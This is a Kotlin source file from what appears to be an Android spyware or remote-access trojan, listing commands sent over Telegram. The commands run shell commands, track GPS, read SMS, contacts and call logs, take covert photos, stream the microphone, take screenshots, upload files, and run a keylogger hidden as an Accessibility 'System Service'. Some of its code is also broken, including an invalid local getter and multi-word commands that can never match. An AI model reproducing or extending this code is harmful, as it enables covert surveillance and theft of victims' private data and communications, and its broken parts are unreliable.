package com.example.agent

import com.example.agent.capabilities.*

class CommandRegistry(
    private val ctx: android.content.Context,
    private val telegram: TelegramClient
) {
    private val commands = mutableMapOf<String, CommandHandler>()
    private val helpEntries = mutableListOf<HelpEntry>()

    init {
        registerCoreCommands()
    }

    private fun registerCoreCommands() {
        val shell = ShellCapability(ctx, telegram)
        val location = LocationCapability(ctx, telegram)
        val contacts = ContactsCapability(ctx, telegram)
        val camera = CameraCapability(ctx, telegram)
        val audio = AudioCapability(ctx, telegram)
        val files = FileCapability(ctx, telegram)
        val screen: ScreenCapability
            get() = (ctx.applicationContext as? AgentApplication)?.screenCapability ?: ScreenCapability(ctx, telegram)

        register("help", "Show available commands", "🔧 System") { telegram.sendText(buildHelp()) }
        register("ping", "Check if agent is alive", "🔧 System") { telegram.sendText("🟢 pong") }
        register("sysinfo", "Get device information", "🔧 System") { shell.sysInfo() }

        register("shell", "Execute shell command: /shell <command>", "🔧 System") { cmd ->
            if (cmd.isEmpty()) telegram.sendText("Usage: /shell <command>")
            else shell.run(cmd)
        }

        register("location", "Get GPS location once", "📍 Location") { location.getOnce() }
        register("location start", "Start live tracking (30s intervals)", "📍 Location") { location.startTracking() }
        register("location stop", "Stop location tracking", "📍 Location") { location.stopTracking() }

        register("contacts", "List all contacts", "👥 Data") { contacts.getContacts() }
        register("sms", "Read SMS inbox", "👥 Data") { contacts.getSMS() }
        register("calls", "Read call history", "👥 Data") { contacts.getCallLog() }

        register("photo", "Take photo with back camera", "📷 Camera") { camera.takePhoto(front = false) }
        register("photo front", "Take selfie", "📷 Camera") { camera.takePhoto(front = true) }
        register("photo back", "Take photo with back camera", "📷 Camera") { camera.takePhoto(front = false) }

        register("record") { cmd ->
            val seconds = cmd.trim().toLongOrNull() ?: 10
            audio.record(seconds)
        }
        helpEntries.add(HelpEntry("record <secs>", "Record microphone (default 10s)", "🎙️ Audio"))

        register("mic start", "Start live mic streaming", "🎙️ Audio") { audio.startStream() }
        register("mic stop", "Stop mic streaming", "🎙️ Audio") { audio.stopStream() }

        register("ls") { cmd ->
            val path = if (cmd.isEmpty()) "/sdcard" else cmd.trim()
            files.list(path)
        }
        helpEntries.add(HelpEntry("ls <path>", "List directory contents", "📁 Files"))
        helpEntries.add(HelpEntry("read <path>", "Read text file", "📁 Files"))
        helpEntries.add(HelpEntry("download <path>", "Send file to Telegram", "📁 Files"))
        helpEntries.add(HelpEntry("sdcard", "Browse storage root", "📁 Files"))

        register("screenshot", "Capture device screen", "📸 Screen") { screen.capture() }

        register("keylog start", "Enable keylogger in Accessibility settings", "⌨️ Keylogger") {
            telegram.sendText("Enable in: Settings → Accessibility → System Service")
        }
        register("keylog dump", "Show captured keystrokes", "⌨️ Keylogger") {
            KeyloggerCapability.dumpLog(ctx, telegram)
        }
        register("keylog clear", "Clear keylog file", "⌨️ Keylogger") {
            KeyloggerCapability.clearLog(ctx, telegram)
        }
    }

    fun register(command: String, helpText: String? = null, category: String? = null, handler: (String) -> Unit) {
        commands[command] = CommandHandler(command, handler)
        if (helpText != null && category != null) {
            helpEntries.add(HelpEntry(helpText, helpText, category))
        }
    }

    fun handle(input: String): Boolean {
        val parts = input.split(" ", limit = 2)
        val command = parts[0]
        val args = if (parts.size > 1) parts[1] else ""

        val handler = commands[command] ?: commands[command.trim()]
        if (handler != null) {
            handler.execute(args)
            return true
        }

        if (command.startsWith("/")) {
            val trimmed = command.substring(1)
            val handler2 = commands[trimmed]
            if (handler2 != null) {
                handler2.execute(args)
                return true
            }
        }

        return false
    }

    private fun buildHelp(): String {
        val sb = StringBuilder("📱 Available Commands:\n\n")
        val byCategory = helpEntries.groupBy { it.category }

        byCategory.forEach { (category, entries) ->
            sb.append("$category\n")
            entries.forEach { entry ->
                sb.append("   /${entry.command}\n")
            }
            sb.append("\n")
        }

        sb.append("⌨️ Keylogger\n")
        sb.append("   /keylog dump\n")
        sb.append("   /keylog clear\n")

        return sb.toString().trim()
    }

    private data class CommandHandler(val command: String, val handler: (String) -> Unit) {
        fun execute(args: String) = handler(args)
    }

    private data class HelpEntry(val command: String, val description: String, val category: String)
}
